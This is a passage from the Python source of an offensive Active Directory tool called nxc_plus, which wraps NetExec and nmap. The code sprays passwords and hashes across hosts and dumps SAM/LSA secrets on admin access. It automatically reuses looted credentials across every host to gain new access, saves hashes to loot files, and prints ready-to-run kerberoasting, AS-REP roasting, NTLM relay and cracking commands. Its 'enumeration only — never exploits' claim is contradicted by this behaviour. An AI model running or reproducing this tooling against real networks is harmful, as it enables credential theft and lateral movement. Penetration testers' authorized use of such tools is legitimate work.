        # deep-scan only those — the nmap+enum pipeline should run on real hosts,
        # not all 254 addresses. Small/explicit target lists skip this.
        preprobed: dict[str, list[str]] | None = None
        if (not self.no_port_probe and not self.recon_only
                and len(self.targets) > max(self.target_workers, 8)):
            preprobed = self._discover_live(self.targets)
            if not preprobed:
                print_info("[!]", "no reachable targets"); return 0
            self.targets = [t for t in self.targets if t in preprobed]
            print()

        results: list[TargetResult] = []
        self._start_heartbeat()
        try:
            target_workers = min(self.target_workers, len(self.targets))
            if target_workers <= 1:
                for target in self.targets:
                    if self._stop.is_set(): break
                    try:
                        r = self._scan_target(
                            target, preprobed.get(target) if preprobed else None)
                        with self._progress_lock:
                            self._scan_done += 1
                            self._done = self._total = 0
                            self._clear_progress()
                        print_target_block(r, self.extra_hash, self.verbose)
                        sys.stdout.flush()
                        with self._progress_lock:
                            if self._scan_done < self._scan_total:
                                self._redraw()
                        if self.creds_file and r.successes:
                            try: append_creds(self.creds_file, r)
                            except OSError as exc:
                                print_info("[!]", f"could not write creds file: {exc}")
                        results.append(r)
                    except KeyboardInterrupt:
                        raise
                    except Exception as exc:
                        r = self._failed_result(target, exc)
                        results.append(r)
            else:
                with self._progress_lock:
                    self._done = self._total = 0
                    self._scan_done = 0
                    self._scan_total = len(self.targets)
                    self._current_proto = f"with {target_workers} target workers"
                    self._redraw()

                with ThreadPoolExecutor(max_workers=target_workers) as pool:
                    future_to_target = {
                        pool.submit(self._scan_target, target,
                                    preprobed.get(target) if preprobed else None,
                                    False): target
                        for target in self.targets
                    }
                    for fut in as_completed(future_to_target):
                        if self._stop.is_set(): break
                        target = future_to_target[fut]
                        try:
                            r = fut.result()
                        except KeyboardInterrupt:
                            raise
                        except Exception as exc:
                            r = self._failed_result(target, exc)
                        with self._progress_lock:
                            self._scan_done += 1
                            self._clear_progress()
                        print_target_block(r, self.extra_hash, self.verbose)
                        sys.stdout.flush()
                        with self._progress_lock:
                            if self._scan_done < self._scan_total:
                                self._redraw()
                        if self.creds_file and r.successes:
                            try: append_creds(self.creds_file, r)
                            except OSError as exc:
                                print_info("[!]", f"could not write creds file: {exc}")
                        results.append(r)
        finally:
            self._stop_heartbeat()
            self._clear_progress()
            if len(results) > 1 and not self._stop.is_set():
                self._print_summary(results)
                self._print_probe_warning(results)
            if not self._stop.is_set():
                self._run_reuse(results)
                self._run_delegation(results)
            if self.json_out:    self._write_json(results)
            if self.script_file: self._write_script(results)
            if not self._stop.is_set():
                self._print_next_steps(results)
        return 130 if self._stop.is_set() else 0

    def _failed_result(self, target: str, exc: Exception) -> TargetResult:
        self._clear_progress()
        print_info("[!]", f"error on {target}: {exc.__class__.__name__}: {exc}")
        if self.debug:
            import traceback; traceback.print_exc()
        else:
            print_info("[!]", "re-run with --debug for traceback")
        failed = TargetResult(target=target)
        failed.scanned = False
        failed.skipped_reason = f"error: {exc.__class__.__name__}"
        return failed

    def _print_probe_warning(self, results: list[TargetResult]) -> None:
        if self.no_port_probe:
            return
        skipped = [r for r in results if not r.scanned and r.skipped_reason == "no open ports"]
        if not skipped:
            return
        print_info("[!]", f"port probe skipped {len(skipped)}/{len(results)} targets with no open checked ports")
        if len(skipped) == len(results):
            print_info("[!]", "no targets reached nxc; retry with --no-port-probe or raise --target-workers more slowly")
            print_info("[*]", "example: nxc3 -t <target> -u <user> -p <pass> --no-port-probe --target-workers 3")
        print()

    # ── banner ─────────────────────────────────────────────────────────
    def _print_banner(self) -> None:
        pl = ("all" if len(self.protocols) == len(ALL_PROTOCOLS)
              else ",".join(self.protocols))
        cl = f"{len(self.passwords)}p / {len(self.hashes)}h"
        print()
        print_info("[*]", f"{CYAN}{BOLD}nxc3{RESET}  |  "
                          f"{len(self.targets)} targets  "
                          f"{len(self.users)} users  {cl}  {self.workers} workers")
        if not self.spray:
            print_info("[*]", f"target workers: {self.target_workers}")
        print_info("[*]", f"protocols: {pl}  timeout: {NETEXEC_TIMEOUT}s/attempt")
        if self.spray:
            delay_str = f"{self.spray_delay}s delay" if self.spray_delay else "no delay"
            print_info("[*]", f"mode: SPRAY  ({delay_str} between rounds)")
        if self.auto_enum:
            print_info("[*]", "auto-enum: ON — valid logins pull shares + "
                              "logged-on users; admin hits dump SAM/LSA; "
                              "DCs hunt SYSVOL GPP creds  (--no-enum to skip)")
        if self.timeout_skip:
            print_info("[*]", "timeout-skip: enabled — dead hosts skipped quickly")
        print_info("[*]", f"nxc log: {self.log_file}")
        if self.creds_file:   print_info("[*]", f"creds output:  {self.creds_file}")
        if self.save_file:    print_info("[*]", f"saving output: {self.save_file}")
        if self.script_file:  print_info("[*]", f"script output: {self.script_file}")
        if self.kerberos:     print_info("[*]", "auth: kerberos cache")
        print()

    # ── summary ────────────────────────────────────────────────────────
    def _print_summary(self, results: list[TargetResult]) -> None:
        self._clear_progress()
        n_win = sum(1 for r in results if r.successes or r.anon_smb)
        # ── FIN banner — clear divider between scan output and the summary/next-steps ──
        bar = "━" * _SEP_W
        print("\n")
        print(f"{BOLD}{CYAN}{bar}{RESET}")
        print(f"{BOLD}{CYAN}  ■ FIN — END OF SCANS  │  SUMMARY & NEXT STEPS BELOW ▼{RESET}")
        print(f"{BOLD}{CYAN}{bar}{RESET}")
        print()
        print_info("[*]", f"scan complete  —  {n_win}/{len(results)} targets with credentials")
        for r in results:
            if not r.scanned: continue
            ip     = r.real_ip or r.target
            host   = r.hostname or r.target
            ok     = r.successes or r.anon_smb
            marker = "[+]" if ok else "[-]"
            proto  = (r.open_protocols[0] if r.open_protocols else "smb").upper()
            port   = PROTOCOL_PORTS.get(r.open_protocols[0]
                                        if r.open_protocols else "smb", 445)
            dc_tag   = " [DC]" if r.is_dc else ""
            cred_tag = (f" — {len(r.successes)} cred(s)" if r.successes else
                        " — anon smb"  if r.anon_smb   else "")
            print_cme(proto, ip, port, host, marker,
                      host + dc_tag + cred_tag + f"  [{r.elapsed:.1f}s]")
        print()

    # ── JSON output ────────────────────────────────────────────────────
    def _write_json(self, results: list[TargetResult]) -> None:
        def ser(s: Success) -> dict:
            return {"protocol":s.protocol,"scope":s.scope,"domain":s.domain,
                    "user":s.user,"secret":s.secret,"auth_type":s.auth_type.value,
                    "is_admin":s.is_admin,"is_guest":s.is_guest,"raw_message":s.raw_message}
        payload = {
            "scan_time":  datetime.now().isoformat(timespec="seconds"),
            "log_file":   self.log_file, "creds_file": self.creds_file,
            "kerberos":   self.kerberos, "protocols":  self.protocols,
            "spray_mode": self.spray,
            "targets": [{
                "target":r.target,"real_ip":r.real_ip,"hostname":r.hostname,
                "domain":r.domain,"is_dc":r.is_dc,"scanned":r.scanned,
                "skipped_reason":r.skipped_reason or None,
                "elapsed_seconds":round(r.elapsed,2),
                "open_protocols":r.open_protocols,"closed_protocols":r.closed_protocols,
                "anon_smb":r.anon_smb,"share_lines":r.share_lines,
                "successes":[ser(s) for s in r.successes],
                "guests":[ser(s) for s in r.guests],
            } for r in results],
        }
        try:
            with open(self.json_out,"w") as f: json.dump(payload,f,indent=2)
            print_info("[*]", f"JSON results: {self.json_out}")
        except OSError as exc:
            print_info("[!]", f"could not write JSON: {exc}")

    # ── shell script output ────────────────────────────────────────────
    def _write_script(self, results: list[TargetResult]) -> None:
        """Write a ready-to-run bash script with all suggested commands."""
        lines = [
            "#!/bin/bash",
            f"# nxc_plus — generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "# Review carefully before running.",
            "# Remove the 'exit 0' at the bottom when ready.",
            "", "set -euo pipefail", "",
        ]
        for r in results:
            if not (r.successes or r.anon_smb or r.share_lines):
                continue
            ip   = r.real_ip or r.target
            host = r.hostname or ip
            dc   = "  [DC]" if r.is_dc else ""
            lines += [
                f"# {'─'*60}",
                f"# {host}  ({ip}){dc}",
                f"# {'─'*60}",
                "",
            ]
            if r.anon_smb:
                lines += [
                    "# ── anonymous SMB ─────────────────────────────",
                    f"smbclient -L //{ip} -N",
                    f"enum4linux-ng -A {ip}",
                    f"nxc smb {ip} -u '' -p '' --shares",
                    "",
                ]
            for s in sorted(r.successes, key=lambda x: (ALL_PROTOCOLS.index(x.protocol)
                            if x.protocol in ALL_PROTOCOLS else 99, int(x.local_auth))):
                if s.is_guest:
                    continue   # guest-only — anon block covers it
                scope = "local" if s.local_auth else "domain"
                lines.append(f"# ── {s.protocol.upper()} / {scope} — {s.user} ──────────")
                try:
                    for label, cmd in build_suggestions(
                            s, ip=ip, hostname=r.hostname,
                            is_dc=r.is_dc, extra_hash=self.extra_hash):
                        lines += [f"# {label}", cmd, ""]
                except Exception:
                    pass
        lines += ["", "exit 0", ""]
        try:
            with open(self.script_file, "w") as f:
                f.write("\n".join(lines))
            os.chmod(self.script_file, 0o755)
            print_info("[*]", f"script written: {self.script_file}  (chmod +x applied)")
        except OSError as exc:
            print_info("[!]", f"could not write script: {exc}")

    # ── read-only AD enrichment (delegation / roastability) ────────────
    def _ldap_base(self, dc_ip: str, s: Success) -> list[str]:
        cmd = ["nxc", "ldap", dc_ip, "-u", s.user]
        if   s.auth_type == AuthType.KERBEROS: cmd.append("--use-kcache")
        elif s.auth_type == AuthType.HASH:     cmd.extend(["-H", s.secret])
        else:                                  cmd.extend(["-p", s.secret])
        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
        return cmd

    def _run_delegation(self, results: list[TargetResult]) -> None:
        """Read-only LDAP enrichment on a DC we have a valid domain cred for.
        Enumerate only — report findings and the attack commands; never exploit."""
        if self.quiet or not self.deleg or self._stop.is_set():
            return
        pick = None
        for r in results:
            if r.is_dc and r.real_ip:
                s = next((x for x in r.successes
                          if not x.local_auth and not x.is_guest), None)
                if s:
                    pick = (r, s); break
        if not pick:
            return
        r, s = pick
        dc_ip = r.real_ip
        base  = self._ldap_base(dc_ip, s)
        SPN   = "(&(samAccountType=805306368)(servicePrincipalName=*)(!(cn=krbtgt)))"
        ASREP = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        checks = [
            ("kerberoastable (SPN) accounts", base + ["--query", SPN, "sAMAccountName"]),
            ("AS-REP roastable (no preauth)", base + ["--query", ASREP, "sAMAccountName"]),
            ("unconstrained delegation",      base + ["--trusted-for-delegation"]),
            ("all delegation rights",         base + ["--find-delegation"]),
            ("password-not-required accounts",base + ["--password-not-required"]),
            ("adminCount=1 (protected)",      base + ["--admin-count"]),
            ("MachineAccountQuota",           base + ["-M", "maq"]),
        ]
        print()
        print_info("[*]", f"AD enrichment — read-only LDAP checks on "
                          f"{r.hostname or dc_ip} as {s.user}  (--no-deleg to skip)")
        found = {}
        for label, cmd in checks:
            if self._stop.is_set():
                break
            stdout, _, timed = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
            if timed:
                print_info("[-]", f"{label}: timed out", indent=1); continue
            # Same hardening as _cred_enum: never let an nxc traceback/error be
            # captured as "findings" (which would poison PRIME TARGETS / the
            # delegation next-steps) — and don't call a hard error "none found".
            hits = [h for h in self._parse_nxc_findings(stdout)
                    if not _is_nxc_noise(h)]
            # Every DC has unconstrained delegation by design — its own machine
            # account is NOT a finding. Drop it so we only flag NON-DC accounts
            # (the ones that are actually exploitable).
            if label == "unconstrained delegation" and r.hostname:
                dcacct = f"{r.hostname}$".lower()
                hits = [h for h in hits if h.split()[0].lower() != dcacct]
            found[label] = hits
            if hits:
                print_info("[+]", f"{label}  ({len(hits)}):", indent=1)
                for h in hits[:40]:
                    print(f"      {h}", flush=True)
            elif _nxc_errored(stdout):
                print_info("[-]", f"{label}: enumeration error (see raw nxc log)", indent=1)
            else:
                print_info("[*]", f"{label}: none found", indent=1)
        self._deleg_next_steps(found, dc_ip, r.domain or "domain.local", s)
        print()

    @staticmethod
    def _parse_nxc_findings(stdout: str) -> list[str]:
        """Strip nxc's 'PROTO  IP  PORT  HOST' prefix and status/banner lines,
        leaving only the actual query results (account names, MAQ value, etc.)."""
        hits = []
        for raw in _ANSI_RE.sub("", stdout).splitlines():
            line = raw.rstrip()
            if not line.strip():
                continue
            # Drop the nxc column prefix:  PROTO  IP  PORT  HOST  <content>
            m = re.match(r"^\s*\S+\s+\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+(.*)$", line)
            content = m.group(1).strip() if m else line.strip()
            if not content:
                continue
            # Skip nxc status markers and the OS/bind banner
            if content.startswith(("[*]", "[-]")):
                continue
            if "(name:" in content and "(domain:" in content:   # OS banner
                continue
            if content.startswith("[+]"):                       # bind-success echo
                continue
            hits.append(content)
        return hits

    def _deleg_next_steps(self, found: dict, dc_ip: str, domain: str, s: "Success") -> None:
        """Turn the enrichment findings into concrete follow-up commands, ordered
        by what actually gets you to DA on a typical (OSCP) domain: go after the
        privileged accounts first, roast second, and keep the advanced/exploit
        chains (noPac/RBCD/relay) clearly marked and last."""
        def has(label):
            return bool(found.get(label))
        # real credential filled in (no more USER:PASS placeholder)
        if s.is_hash:
            cred, chash = f"{domain}/{s.user}", f" -hashes :{s.secret}"
        else:
            cred, chash = f"{domain}/{s.user}:{s.secret}", ""

        primary, advanced = [], []

        # 1) PRIME TARGETS first — the actual goal
        if has("adminCount=1 (protected)"):
            BUILTIN = {"administrator", "krbtgt", "guest", "defaultaccount"}
            allnames = found["adminCount=1 (protected)"]
            targets  = [n for n in allnames if n.split()[0].lower() not in BUILTIN]
            if targets:
                primary.append((f"PRIME TARGETS — privileged non-default accounts: "
                                f"{', '.join(t.split()[0] for t in targets[:8])}",
                                "owning ANY one = likely domain compromise. Get their creds: "
                                "password-spray (no lockout here), cred reuse from looted hosts, "
                                "hunt SYSVOL/shares/descriptions, or dump a box one logged into"))
        # 2) roasting (realistic, offline, no lockout)
        if has("kerberoastable (SPN) accounts"):
            primary.append(("kerberoast the SPN accounts (crack offline, no lockout risk)",
                            f"impacket-GetUserSPNs -request -dc-ip {dc_ip} {cred}{chash} "
                            f"-outputfile kerb.hash  &&  john --format=krb5tgs kerb.hash --wordlist={WORDLIST}"))
        if has("AS-REP roastable (no preauth)"):
            primary.append(("AS-REP roast (no creds needed for the roast itself)",
                            f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -request -no-pass "
                            f"-usersfile users.txt  &&  john --format=krb5asrep asrep.hash --wordlist={WORDLIST}"))

        # 3) advanced / exploit chains — only real NON-DC findings, clearly flagged
        unc = found.get("unconstrained delegation") or []   # DC already filtered out upstream
        if unc:
            advanced.append(("unconstrained delegation on a NON-DC host — coerce a DC to auth "
                             f"to it, capture its TGT: {', '.join(u.split()[0] for u in unc[:5])}",
                             "impacket-ntlmrelayx + PetitPotam/printerbug  (exploit — run manually)"))
        maq = found.get("MachineAccountQuota") or []
        maq_val = next((x.split(":")[-1].strip() for x in maq if "Quota" in x), None)
        if maq_val and maq_val.isdigit() and int(maq_val) > 0:
            advanced.append((f"MachineAccountQuota={maq_val} — add-computer -> RBCD / noPac "
                             f"(advanced; rarely the OSCP path)",
                             f"impacket-addcomputer {cred}{chash} -dc-ip {dc_ip} "
                             f"-computer-name 'FAKE$' -computer-pass 'Pass123!'"))

        if not primary and not advanced:
            return
        print()
        print_info("[*]", "enrichment — suggested next steps", indent=1)
        for why, cmd in primary:
            print(f"      {ORANGE}# {why}{RESET}", flush=True)
            print(f"      {cmd}", flush=True)
        if advanced:
            print(f"      {DIM}── advanced / exploit chains (verify, run by hand) ──{RESET}", flush=True)
            for why, cmd in advanced:
                print(f"      {DIM}# {why}{RESET}", flush=True)
                print(f"      {DIM}{cmd}{RESET}", flush=True)

    # ── next steps ─────────────────────────────────────────────────────
    def _reuse_cred_set(self, results) -> list[tuple]:
        """Unique (kind, user, secret, origin) from all loot — plaintext + PtH.
        Skips machine accounts and empty-password NT hashes."""
        seen, creds = set(), []
        for r in results:
            for pc in r.plaintext:
                if ":" not in pc:
                    continue
                u, p = pc.split(":", 1)
                if u.endswith("$") or not p:
                    continue
                k = ("pw", u.lower(), p)
                if k in seen:
                    continue
                seen.add(k); creds.append(("pw", u, p, r.real_ip or r.target))
            for h in r.loot_hashes:
                parts = h.split(":")
                if len(parts) < 4 or "$DCC2$" in h:
                    continue
                user, nt = (parts[0], parts[3]) if parts[1].isdigit() else (parts[0], parts[2])
                if user.endswith("$") or nt == "31d6cfe0d16ae931b73c59d7e0c089c0":
                    continue
                k = ("nt", user.lower(), nt)
                if k in seen:
                    continue
                seen.add(k); creds.append(("nt", user, nt, r.real_ip or r.target))
        return creds

    def _run_reuse(self, results: list[TargetResult]) -> None:
        """Spray every looted credential across every host — the pivot engine.
        Reports only genuinely NEW access (admin on a box we didn't own, or a
        foothold where we had none)."""
        if self.kerberos or self._stop.is_set():
            return
        creds = self._reuse_cred_set(results)
        if not creds:
            return
        ips = sorted({r.real_ip or r.target for r in results if (r.real_ip or r.target)})
        admin_ips = {r.real_ip for r in results if any(s.is_admin for s in r.successes)}
        valid_ips = {r.real_ip for r in results
                     if any(not s.is_guest for s in r.successes)}
        domain = next((r.domain for r in results if r.domain), "")
        print_info("[*]", f"reusing {len(creds)} looted credential(s) across "
                          f"{len(ips)} host(s) for NEW access")
        pivots, seen_report = [], set()
        self._start_heartbeat()
        for kind, user, secret, origin in creds:
            if self._stop.is_set():
                break
            with self._progress_lock:
                self._phase = f"reuse: {user}"
                self._redraw()
            scopes = [["--local-auth"]]
            if domain:
                scopes.append(["-d", domain])
            for scope in scopes:
                cmd = ["nxc", "smb", *ips, "-u", user]
                cmd += (["-H", secret] if kind == "nt" else ["-p", secret])
                cmd += scope + ["--timeout", str(NETEXEC_TIMEOUT)]
                try:
                    so, _, timed = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
                except InterruptedError:
                    return
                if timed:
                    continue
                for raw in _ANSI_RE.sub("", so).splitlines():
                    marker, msg = parse_nxc_line(raw)
                    if marker != "[+]":
                        continue
                    hip = extract_ipv4(raw)
                    admin = "Pwn3d!" in raw
                    new = (admin and hip not in admin_ips) or \
                          (not admin and hip not in valid_ips)
                    if not new or (hip, admin) in seen_report:
                        continue
                    seen_report.add((hip, admin))
                    (admin_ips if admin else valid_ips).add(hip)
                    sc = "local" if "--local-auth" in scope else "domain"
                    tag = "Pwn3d!" if admin else "foothold"
                    print_info("[+]", f"NEW ACCESS  {hip}  {user} ({sc}) {tag}  "
                                      f"<- looted from {origin}", indent=1)
                    pivots.append((hip, user, sc, admin, origin))
        self._stop_heartbeat()
        self._reuse_pivots = pivots
        if not pivots:
            print_info("[*]", "no looted credential opened a new box "
                              "(the creds we hold don't pivot here)", indent=1)
        print()

    def _print_loot(self, results: list[TargetResult]) -> None:
        """LOOT + PIVOT sections: hash type IDed with the exact crack/use command,
        plaintext creds, and dual-homed pivot subnets."""
        ntlm  = sorted({h for r in results for h in r.loot_hashes
                        if ":::" in h})
        dcc2  = sorted({h for r in results for h in r.loot_hashes if "$DCC2$" in h})
        plain = sorted({p for r in results for p in r.plaintext})
        pivots = {}
        for r in results:
            for net in r.pivot_subnets:
                pivots.setdefault(net, r.real_ip or r.target)
        if not (ntlm or dcc2 or plain or pivots):
            return

        loot_dir = os.path.join(os.getcwd(), "nxc_plus-loot")
        def dump(name, data):
            if not data: return ""
            os.makedirs(loot_dir, exist_ok=True)
            path = os.path.join(loot_dir, name)
            try:
                open(path, "w").write("\n".join(data) + "\n"); return path
            except OSError: return ""

        print()
        print_info("[*]", "loot")
        if plain:
            print_info("[+]", f"PLAINTEXT ({len(plain)}) — use directly, no cracking:", indent=1)
            for p in plain[:8]:
                print_info("[+]", p, indent=2)
            dump("plaintext_creds.txt", plain)
        if ntlm:
            path = dump("ntlm_hashes.txt", ntlm)
            print_info("[*]", f"NTLM ({len(ntlm)}) -> pass-the-hash directly, or crack:", indent=1)
            print_info("[*]", f"john --format=NT {path} --wordlist={WORDLIST}"
                              f"   {DIM}(hashcat -m 1000){RESET}", indent=2)
        if dcc2:
            path = dump("dcc2.hash", dcc2)
            print_info("[*]", f"DCC2 cached ({len(dcc2)}) -> MUST crack:", indent=1)
            print_info("[*]", f"john --format=mscash2 {path} --wordlist={WORDLIST}"
                              f"   {DIM}(hashcat -m 2100){RESET}", indent=2)
        if pivots:
            print()
            print_info("[!]", "PIVOT SUBNETS — hidden networks via dual-homed hosts", indent=0)
            for net, via in sorted(pivots.items()):
                print_info("[!]", f"{net}  via {via}", indent=1)
                print_info("[*]", f"# tunnel through {via}, then: nxc_plus {net} -u <user> -p <pass>", indent=2)

    def _print_next_steps(self, results: list[TargetResult]) -> None:
        if self.quiet: return
        dcs: dict[str,list[tuple[str,str]]] = {}
        for r in results:
            if r.is_dc and r.real_ip:
                dcs.setdefault(r.domain or "<DOMAIN>", []).append(
                    (r.hostname or r.real_ip, r.real_ip))
        has_dcs   = bool(dcs)
        has_files = bool(self.save_file or self.creds_file or
                         self.json_out  or self.log_file or self.script_file)
        self._print_loot(results)
        if not has_dcs and not has_files: return

        # Only show the "next steps" header when there's real AD content — in
        # recon mode (no DC owned) the nmap per-port hints already cover it.
        if has_dcs:
            print_info("[*]", "next steps")
            print_info("[*]", "domain controllers", indent=1)
            for domain, hosts in dcs.items():
                for hostname, ip in hosts:
                    suffix = f"  ({domain})" if domain != "<DOMAIN>" else ""
                    print_info("[*]", f"{hostname}  {ip}{suffix}", indent=2)
            print()
            print_info("[*]", "no-auth AD attacks", indent=1)
            for domain, hosts in dcs.items():
                dc_ip = hosts[0][1]
                dom   = domain if domain != "<DOMAIN>" else "<DOMAIN>"
                print_info("[*]", f"# enumerate users", indent=2)
                print_info("[*]",
                    f"kerbrute userenum --dc {dc_ip} -d {dom} "
                    f"/usr/share/seclists/Usernames/Names/names.txt", indent=2)
                print_info("[*]", "# AS-REP roast (no creds needed)", indent=2)
                print_info("[*]",
                    f"impacket-GetNPUsers {dom}/ -dc-ip {dc_ip} "
                    f"-request -no-pass -usersfile users.txt", indent=2)
            print()
            print_info("[*]", "cracking hashes  (john = CPU, works without a GPU)", indent=1)
            print_info("[*]", f"john --format=krb5asrep asrep.hash --wordlist={WORDLIST}  # AS-REP  (hashcat -m 18200)", indent=2)
            print_info("[*]", f"john --format=krb5tgs   kerb.hash  --wordlist={WORDLIST}  # Kerberoast  (hashcat -m 13100)", indent=2)
            print_info("[*]", f"john --format=NT        ntds.hash  --wordlist={WORDLIST}  # NTLM  (hashcat -m 1000)", indent=2)

        if has_files:
            print()
            print_info("[*]", "output files", indent=1)
            if self.save_file:   print_info("[*]", f"formatted output  ->  {self.save_file}",   indent=2)
            if self.creds_file:  print_info("[*]", f"valid creds (TSV) ->  {self.creds_file}",  indent=2)
            if self.json_out:    print_info("[*]", f"json results      ->  {self.json_out}",     indent=2)
            if self.script_file: print_info("[*]", f"shell script      ->  {self.script_file}",  indent=2)
            if self.log_file:    print_info("[*]", f"nxc raw log       ->  {self.log_file}",     indent=2)
        print()


# ─── CLI ───────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="nxc_plus",
        description=(
            f"{BOLD}nxc3{RESET} — all-in-one recon: nmap service scan + "
            f"NetExec (nxc) across every protocol\n"
            f"Point it at a target (with or without creds). Discovers hosts, scans "
            f"ports/services, tests creds where given, and surfaces next-step commands. "
            f"Enumeration only — never exploits. (fork of Marksploit)"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{BOLD}EXAMPLES{RESET}

  Basic spray against a single host:
    nxc3 -t 192.168.1.10 -u admin -p 'Password123'

  CIDR range, multiple users and passwords:
    nxc3 -t 192.168.1.0/24 -u users.txt -p passwords.txt

  Pass-the-Hash:
    nxc3 -t 192.168.1.10 -u admin -H aad3b435...:31d6cfe0...

  Kerberos ticket cache:
    nxc3 -t dc01.corp.local -u admin -k

  Specific protocols only:
    nxc3 -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp

  {BOLD}Lockout-safe spray across subnet (recommended for AD){RESET}:
    nxc3 -t 192.168.1.0/24 -u users.txt -p passwords.txt \\
               --spray --spray-delay 30

  Full output suite (credentialed enum runs automatically):
    nxc3 -t targets.txt -u users.txt -p passwords.txt \\
               --spray --spray-delay 60 \\
               --creds-file creds.tsv --script cmds.sh -S output.txt

{BOLD}SPRAY vs NORMAL MODE{RESET}

  Normal:  for each target -> test all creds   (fast, lockout risk on AD)
  Spray:   for each cred   -> test all targets  (lockout-safe, recommended for AD)

  Use --spray-delay 30 to match a standard 30-minute observation window.
  A delay of 0 means no pause — only safe on non-AD or permissive lockout policy.
"""
    )

    tgt = p.add_argument_group("TARGET")
    tgt.add_argument("-t", "--target", required=True,
        metavar="TARGET",
        help="IP, hostname, CIDR, or file of targets (one per line).")

    cred = p.add_argument_group("CREDENTIALS (optional — omit for pure recon)")
    cred.add_argument("-u", "--user", required=False,
        metavar="USER",
        help="Username or file of usernames. Omit for unauthenticated recon only.")
    cred.add_argument("-p", "--password",
        metavar="PASS",
        help="Password or file of passwords.")
    cred.add_argument("-H", "--hash",
        metavar="HASH",
        help="NTLM hash (LM:NT or NT-only). File of hashes also accepted.")
    cred.add_argument("-k", "--kerberos", action="store_true",
        help="Use Kerberos ticket cache ($KRB5CCNAME). Cannot mix with -p/-H.")

    proto = p.add_argument_group("PROTOCOLS")
    proto.add_argument("--protocols", metavar="LIST",
        help=f"Comma-separated subset to test. "
             f"Default: all. Valid: {','.join(ALL_PROTOCOLS)}")
    proto.add_argument("--no-port-probe", action="store_true",
        help="Skip TCP port probe — test all selected protocols regardless.")
    proto.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
        metavar="N",
        help=f"Max hosts to expand from a CIDR. Default: {DEFAULT_MAX_CIDR_HOSTS}.")
    proto.add_argument("--timeout-skip", action="store_true",
        help="If a host times out on one protocol, skip remaining protocols "
             "for that host immediately rather than waiting them out.")

    spray = p.add_argument_group("SPRAY MODE  (lockout-safe AD spraying)")
    spray.add_argument("--spray", action="store_true",
        help="Enable spray mode: iterate credentials-first across all targets. "
             "One attempt per account per round — safe against lockout policies.")
    spray.add_argument("--spray-delay", type=int, default=DEFAULT_SPRAY_DELAY,
        metavar="SECONDS",
        help=f"Seconds to wait between spray rounds. Default: {DEFAULT_SPRAY_DELAY}. "
             "Set 0 for no delay (only safe on non-AD or permissive policy).")

    out = p.add_argument_group("OUTPUT")
    out.add_argument("-o", "--output",
        metavar="FILE",
        help="Path for the nxc raw log. Default: YYYY-MM-DD_HH-MM-SS.txt")
    out.add_argument("--creds-file", metavar="FILE",
        help="Append confirmed valid credentials to a TSV file.")
    out.add_argument("--json-output", metavar="FILE",
        help="Write full structured results to a JSON file.")
    out.add_argument("-S", "--save", metavar="FILE",
        help="Save all formatted output to a plain-text file (ANSI stripped).")
    out.add_argument("--script", metavar="FILE",
        help="Write a ready-to-run bash script of all suggested commands. "
             "Script is chmod +x'd automatically.")

    misc = p.add_argument_group("MISC")
    misc.add_argument("--no-enum", action="store_true",
        help="Skip the automatic credentialed enumeration that runs on a valid "
             "login (shares + logged-on users, SAM/LSA dumps on an admin hit, "
             "GPP/autologin cred hunt on a DC). On by default.")
    misc.add_argument("--auto-enum", action="store_true",
        help=argparse.SUPPRESS)   # back-compat no-op: enumeration is now default-on
    misc.add_argument("--no-deleg", action="store_true",
        help="Skip the automatic read-only AD enrichment (delegation / roastability "
             "/ MachineAccountQuota LDAP checks) that runs on a valid DC login.")

    recon = p.add_argument_group("RECON (nmap service scan)")
    recon.add_argument("--no-nmap", action="store_true",
        help="Skip the nmap service scan (host discovery + nxc only).")
    recon.add_argument("--full", action="store_true",
        help="Scan all 65535 TCP ports (two-stage). Default scans the top ports only.")
    recon.add_argument("--nmap-top", type=int, default=1000, metavar="N",
        help="Top-N TCP ports for the default (non --full) scan. Default: 1000.")
    recon.add_argument("--nmap-rate", type=int, default=5000, metavar="N",
        help="nmap --min-rate. Default: 5000.")
    recon.add_argument("--nmap-timeout", type=int, default=300, metavar="SEC",
        help="Max seconds per nmap stage. Default: 300.")
    misc.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
        metavar="N",
        help=f"Parallel workers per target. Default: {DEFAULT_WORKERS}.")
    misc.add_argument("--target-workers", type=int, default=DEFAULT_TARGET_WORKERS,
        metavar="N",
        help=f"Parallel targets in normal mode. Default: {DEFAULT_TARGET_WORKERS}.")
    misc.add_argument("-q", "--quiet", action="store_true",
        help="Suppress banner and next-steps section.")
    misc.add_argument("-v", "--verbose", action="store_true",
        help="Show [-] failure lines for every attempt.")
    misc.add_argument("--no-color", action="store_true",
        help="Disable ANSI colour output.")
    misc.add_argument("--debug", action="store_true",
        help="Print full Python tracebacks on errors.")

    return p.parse_args()


def main() -> int:
    args = parse_args()
    configure_colors(args.no_color)

    if not shutil.which("nxc"):
        print(f"{RED}{BOLD}Error:{RESET} 'nxc' (NetExec) not found on PATH.\n"
              f"  Install: pip install netexec", file=sys.stderr)
        return 1

    if args.kerberos and (args.password or args.hash):
        print(f"{RED}{BOLD}Error:{RESET} -k cannot combine with -p or -H.",
              file=sys.stderr); return 1
    # Creds are optional: pure recon runs with no -u at all. If a user IS given,
    # a secret must come with it.
    if args.user and not args.kerberos and not args.password and not args.hash:
        print(f"{RED}{BOLD}Error:{RESET} -u given but no secret — add -p, -H, or -k "
              f"(or drop -u for recon-only).", file=sys.stderr); return 1

    # Install Tee before anything prints
    tee: Tee|None = None
    if args.save:
        try:
            tee = Tee(args.save); sys.stdout = tee
        except OSError as exc:
            print(f"{RED}{BOLD}Error:{RESET} cannot open save file: {exc}",
                  file=sys.stderr); return 1

    try:
        raw_targets = read_value_or_file(args.target)
        targets     = expand_targets(raw_targets, args.max_cidr_hosts)
        if not targets:
            raise ValueError("No targets after expansion.")
        users     = read_value_or_file(args.user) if args.user else []
        passwords = read_value_or_file(args.password) if args.password else []
        hashes    = read_value_or_file(args.hash)     if args.hash     else []
